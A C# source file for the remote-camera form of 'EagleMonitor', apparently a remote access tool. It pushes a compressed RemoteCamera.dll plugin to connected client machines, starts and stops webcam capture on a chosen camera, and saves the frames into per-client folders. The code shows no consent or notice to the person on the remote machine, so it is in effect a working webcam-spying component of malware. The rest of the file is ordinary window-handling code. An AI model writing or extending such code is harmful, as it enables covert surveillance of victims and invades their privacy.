using EagleMonitor.Controls;
using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class RemoteCameraForm : FormPattern
    {
        internal ClientHandler clientHandler { get; set; }
        public bool hasAlreadyConnected { get; set; }
        private string baseIp { get; set; }
        private int currentPanelHeight { get; set; }

        internal RemoteCameraForm(string baseIp)
        {
            this.baseIp = baseIp;
            InitializeComponent();
            this.currentPanelHeight = panel1.Height;
        }

        private void RemoteCamera_Shown(object sender, EventArgs e)
        {
            RemoteCameraPacket remoteCameraPacket = new RemoteCameraPacket();
            remoteCameraPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteCamera.dll"), 1);
            ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteCameraPacket);
        }

        private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                if (camerasGuna2ComboBox.Items.Count > 0 && camerasGuna2ComboBox.SelectedItem != null)
                {
                    RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_ON);

                    remoteCameraCapturePacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteCamera.dll"), 1);
                    remoteCameraCapturePacket.timeMS = 1;
                    remoteCameraCapturePacket.index = camerasGuna2ComboBox.SelectedIndex;
                    remoteCameraCapturePacket.quality = qualityGuna2TrackBar.Value;
                    this.loadingCircle1.Visible = true;
                    this.loadingCircle1.Active = true;
                    ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteCameraCapturePacket);
                }
            }
            else
            {
                if (clientHandler != null && camerasGuna2ComboBox.Items.Count > 0)
                {
                    this.loadingCircle1.Visible = false;
                    this.loadingCircle1.Active = false;
                    RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF)
                    {
                        baseIp = this.baseIp,
                        HWID = ClientHandler.ClientHandlersList[baseIp].HWID
                    };
                    this.clientHandler.SendPacket(remoteCameraCapturePacket);
                }
            }
        }

        private void intervalGuna2TextBox_TextChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_ON);

                remoteCameraCapturePacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteCamera.dll"), 1);
                remoteCameraCapturePacket.timeMS = 1;
                this.loadingCircle1.Visible = true;
                this.loadingCircle1.Active = true;

                this.clientHandler.SendPacket(remoteCameraCapturePacket);
            }
        }

        private void hidePanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Thread(() => 
            {
                while (panel1.Height > panel2.Height) 
                {
                    panel1.Height -= 2;
                    Thread.Sleep(10);
                }
            }).Start();
        }

        private void showPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                while (currentPanelHeight > panel1.Height)
                {
                    panel1.Height += 2;
                    Thread.Sleep(10);
                }
            }).Start();
        }

        private void saveCurrentPcitureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
            File.WriteAllBytes(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Camera\\" + Date + "." + "png", PacketLib.Utils.ImageProcessing.ImageToBytes(this.cameraViewerPictureBox.Image));
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked) 
            {
                RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF)
                {
                    baseIp = this.baseIp,
                    HWID = ClientHandler.ClientHandlersList[baseIp].HWID
                };
                this.clientHandler.SendPacket(remoteCameraCapturePacket);
            }
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label3_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
